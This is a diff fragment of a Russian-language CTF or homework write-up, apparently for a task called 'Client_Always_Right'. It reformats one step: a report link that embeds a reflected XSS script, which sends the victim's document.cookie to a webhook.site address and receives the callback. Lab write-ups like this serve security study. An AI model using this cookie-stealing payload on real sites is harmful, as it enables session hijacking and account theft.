@@ -19,7 +19,7 @@
 ![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Client_Always_Right/Screenshot_139.png?raw=true)
 
 Изменим ссылку репорта, на ссылку страницы поиска с внедрённым пейлоадом. Итоговая ссылка будет выглядеть так
->http://62.173.140.174:16013/?report=http://62.173.140.174:16013/?search=<script>document.location='https://webhook.site/a2b7f0c7-8ea3-44a8-ba64-927c4c4d1927/?cookie='%252BencodeURIComponent(document.cookie)</script>
+```http://62.173.140.174:16013/?report=http://62.173.140.174:16013/?search=<script>document.location='https://webhook.site/a2b7f0c7-8ea3-44a8-ba64-927c4c4d1927/?cookie='%252BencodeURIComponent(document.cookie)</script>```
 
 Вставляем её в адресную строку, получаем отстук на webhook:
 
